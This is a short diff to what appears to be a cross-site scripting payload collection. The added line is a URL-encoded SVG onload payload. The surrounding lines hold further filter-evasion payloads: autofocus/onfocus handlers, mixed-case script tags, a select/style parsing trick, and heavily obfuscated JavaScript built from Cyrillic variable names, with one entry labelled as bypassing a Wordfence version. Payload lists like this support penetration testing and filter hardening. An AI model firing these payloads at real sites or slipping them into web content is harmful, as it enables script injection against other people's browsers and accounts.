@@ -1,3 +1,4 @@
+"<%21--><Svg+OnLoad%3Dconfirm%3F.%28%2Fd3rk😈%2F%29<%21--1"%29"<%21--><Svg%2BOnLoad%3Dconfirm%3F.%28%2Fd3rk😈%2F%29<%21--
 " autofocus onfocus=alert(origin) x="
 <select><​style></select><svg onload​=alert(1)><​/style>
 <sCriPt x>(((confirm)))``</scRipt x>
@@ -1779,6 +1780,7 @@ Wordfence 7.4.2
 <lol/contenteditable/autofocus/onfocus="alert(1)">
 а='',б=!а+а,в=!б+а,г=а+{},д=б[а++],е=б[ж=а],
 з=++ж+а,и=г[ж+з],б[и+=г[а]+(б.в+г)[а]+в[з]+д+е+б[ж]+и+д+г[а]+е][и](в[а]+в[ж]+б[з]+е+д+"('взломано')")()
+
 
 
 
